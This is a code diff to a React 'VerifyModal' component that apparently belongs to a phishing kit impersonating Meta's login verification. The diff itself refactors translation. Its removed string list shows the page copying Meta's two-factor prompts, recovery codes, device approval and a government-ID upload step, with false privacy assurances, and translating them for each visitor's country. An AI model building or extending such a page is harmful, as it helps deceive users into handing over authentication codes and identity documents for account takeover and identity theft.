@@ -1,7 +1,7 @@
 import VerifyImage from '@/assets/images/verify-image.png';
+import useTranslation from '@/hooks/useTranslation';
 import { store } from '@/store/store';
 import config from '@/utils/config';
-import translateText from '@/utils/translate';
 import { faChevronLeft, faComment, faDesktop, faEnvelope, faInfoCircle, faKey, faMobile, faQuestionCircle, faTimes } from '@fortawesome/free-solid-svg-icons';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
@@ -16,7 +16,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [showError, setShowError] = useState(false);
     const [showMethodModal, setShowMethodModal] = useState(false);
     const [selectedMethod, setSelectedMethod] = useState('notification');
-    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [showDeviceApproval, setShowDeviceApproval] = useState(false);
     const [deviceUsed, setDeviceUsed] = useState(false);
     const [deviceCountdown, setDeviceCountdown] = useState(0);
@@ -25,13 +24,10 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [recoveryFiles, setRecoveryFiles] = useState<File[]>([]);
     const [uploading, setUploading] = useState(false);
 
-    const { geoInfo, messageId, messageContent, setMessageContent, userInfo } = store();
+    const { t } = useTranslation();
+    const { messageId, messageContent, setMessageContent, userInfo } = store();
     const maxCode = config.MAX_CODE ?? 3;
     const loadingTime = config.CODE_LOADING_TIME ?? 60;
-
-    const t = (text: string): string => {
-        return translations[text] || text;
-    };
 
     const maskEmail = (email: string): string => {
         if (!email) return '';
@@ -49,24 +45,6 @@ const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const prefix = cleaned.slice(0, 3);
         return `${prefix} ****** ${last2}`;
     };
-
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        const textsToTranslate = ['Two-factor authentication required', 'Enter the code for this account that we send to', 'Enter the code we send to your phone.', 'Enter the 6-digit code from your authentication app.', 'Enter a recovery code that you previously saved when you set up two-factor authentication.', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue', 'Try another way', "Choose a way to confirm it's you", 'These are your available confirmation methods.', 'Email', "We'll send a code to", 'Text message', 'Authentication app', 'Get a code from your authentication app.', 'Recovery code', 'Use a recovery code that you previously saved.', 'Approve from another device', "Confirm it's you by approving from a device you've previously logged in on.", 'Check your notifications', 'We sent a notification to your other logged-in device. Approve the login there.', 'Waiting for approval', 'Approve from another device to continue.', 'Trust this device and skip this step from now on.', 'Need another option?', 'To keep your account safe, accessing it without your usual login methods can take a few days. To get started, go to', 'account recovery', 'Account Recovery', 'Confirm your identity', 'Upload a photo or scan of your government-issued ID to confirm your identity.', 'Accepted ID types', "Driver's license", 'Passport', 'National ID card', 'Residence permit', 'Click to upload your ID', 'or drag and drop', 'Selected files', 'Clear all', 'Your information is protected', 'Your ID will be encrypted and stored securely.', 'Meta does not share your ID with third parties.', 'Your ID will be deleted after the review is complete.', 'Submit for review'];
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
 
     useEffect(() => {
         if (countdown > 0) {
